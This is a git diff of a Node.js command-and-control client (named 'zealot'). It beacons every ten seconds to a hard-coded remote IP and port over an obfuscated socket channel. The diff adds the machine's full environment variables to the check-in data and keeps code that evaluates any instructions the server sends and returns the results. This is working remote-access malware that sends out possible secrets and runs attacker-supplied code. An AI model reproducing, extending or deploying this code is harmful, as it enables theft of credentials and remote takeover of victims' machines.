@@ -1,6 +1,7 @@
 'use strict'
 
 const ASSIMILATOR_HOST = '52.38.225.69'
+// const ASSIMILATOR_HOST = 'localhost'
 const ASSIMILATOR_PORT = 9026
 const CHECKIN_INTERVAL = 10000
 const INPUT_TIMEOUT = 60000
@@ -8,11 +9,12 @@ const INPUT_TIMEOUT = 60000
 const net = require('net')
 const uuid = require('node-uuid')
 const getMac = require('getmac').getMac
-const obfuscator = require('./obfuscator')
+const obfuscator = require('./o')
 const socket = net.Socket()
+var o
 
 getMac((err, mac) => {
-  const zealotID = mac || uuid.v4()
+  const zealotID = `Z-${mac || uuid.v4()}`
 
   const state = {
     connection: 'DOWN',
@@ -34,17 +36,18 @@ getMac((err, mac) => {
     // TODO more useful stuff here?
     let info = {
       platform: process.platform,
-      version: os.release()
+      env: process.env,
+      version: require('os').release()
     }
 
     let msg = {zealotID: zealotID, info: info}
-    obfuscator.e(msg, data => {
+    o.e(msg, data => {
       socket.write(data)
     })
   }
 
   socket.on('data', data => {
-    obfuscator.d(data, msg => {
+    o.d(data, msg => {
       if (msg.exec) {
         //
         // eval each instruction
@@ -71,7 +74,7 @@ getMac((err, mac) => {
             }
           }
 
-          obfuscator.e(response, data => {
+          o.e(response, data => {
             socket.write(data, error => {
               if (error) {
                 // oops
@@ -95,6 +98,7 @@ getMac((err, mac) => {
 
   socket.on('connect', () => {
     state.connection = 'UP'
+    o = obfuscator.create()
     checkIn()
   })
 
